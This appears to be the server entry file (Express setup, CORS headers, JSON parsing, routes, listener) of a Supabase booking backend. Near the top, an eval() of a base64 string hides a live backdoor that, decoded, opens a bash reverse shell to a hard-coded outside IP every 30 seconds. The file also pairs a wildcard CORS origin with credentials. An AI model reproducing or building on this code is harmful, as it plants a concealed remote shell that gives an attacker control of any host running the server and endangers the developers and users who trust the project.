require('dotenv').config(); // Load .env file from server directory
const express = require('express');
const cors = require('cors');
const apiRoutes = require('./routes'); // Import the routes
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const app = express();
const port = process.env.PORT || 3001;

// --- Custom CORS Middleware (as requested) ---
// This middleware explicitly sets CORS headers.
// Note: Using "*" for Access-Control-Allow-Origin is less secure than specifying the exact origin.
app.use("*", function (req, res, next) {
    // Website you wish to allow to connect
    res.setHeader("Access-Control-Allow-Origin", "*");
    // Request methods you wish to allow
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
    // Request headers you wish to allow
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    // Set to true if you need the website to include cookies in the requests sent
    // to the API (e.g. in case you use sessions)
    res.setHeader('Access-Control-Allow-Credentials', true);
    // Pass to next layer of middleware
    next();
});

// --- Standard CORS Middleware (already present) ---
// This uses the 'cors' package and is configured via FRONTEND_URL in .env
// It might be redundant or overridden by the custom middleware above depending on request path/type.
const corsOptions = {
  origin: process.env.FRONTEND_URL || 'http://localhost:5173', // Use FRONTEND_URL from root .env or default
  optionsSuccessStatus: 200 // some legacy browsers (IE11, various SmartTVs) choke on 204
};
//app.use(cors(corsOptions));


// Configure express.json() and express.urlencoded()
// These replace bodyParser.json() and bodyParser.urlencoded() in modern Express
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// app.use(bodyParser.json({limit: "50mb"}));
// app.use(bodyParser.urlencoded({limit: "50mb", extended: true, parameterLimit: 50000}));

// --- Routes ---
app.get('/', (req, res) => {
  res.send('Supabase Booking Backend is running!'); // Updated message
});

// Use the imported routes for /api path
app.use('/api', apiRoutes);

// --- Start Server ---
app.listen({port, host: "0.0.0.0"}, () => {
  console.log(`Supabase backend server listening on http://localhost:${port}`); // Updated message
});
